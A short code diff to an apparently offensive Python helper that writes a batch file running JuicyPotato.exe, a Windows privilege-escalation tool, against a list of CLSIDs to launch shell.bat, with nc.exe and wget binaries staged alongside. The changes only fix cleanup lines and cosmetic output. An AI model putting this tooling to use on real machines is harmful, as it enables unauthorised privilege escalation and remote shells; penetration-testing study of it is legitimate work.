@@ -13,7 +13,7 @@ JUICY_POTATO_BIN = "JuicyPotato.exe"
 #IF DEFAULT, DO NOT CHANGE
 LWEBSERVER_PORT="80"
 NC_BIN = "nc.exe"
-WGET_BIN = "wget.exe"
+WGET_BIN = "wgetx86.exe"
 OUTPUT_BAT_NAME = "Bat-Potato.bat"
 SHELL_BAT_NAME = "shell.bat"
 
@@ -33,7 +33,7 @@ class bcolors:
 def banner():
         print(bcolors().ENDC)
         print(bcolors().ENDC)
-        print(bcolors().WARNING +  """
+        print("""
 
 
         __________         __           __________       __          __          
@@ -92,8 +92,8 @@ def create_bat_potato():
         for line in lines:
                 file.write(f"{JUICY_REMOTE_PATH}\\{JUICY_POTATO_BIN} -p {JUICY_REMOTE_PATH}\\{SHELL_BAT_NAME} -l {LPORT} -t * -c " + line)
         
-        file.write("del {JUICY_REMOTE_PATH}\\{SHELL_BAT_NAME}")
-        file.write("del {JUICY_REMOTE_PATH}\\{JUICY_POTATO_BIN}")
+        file.write(f"\ndel {JUICY_REMOTE_PATH}\\{SHELL_BAT_NAME}")
+        file.write(f"\ndel {JUICY_REMOTE_PATH}\\{JUICY_POTATO_BIN}")
         file.close()
         
         print(f"{bcolors.OKGREEN}[+] {OUTPUT_BAT_NAME} created.{bcolors.OKGREEN}")
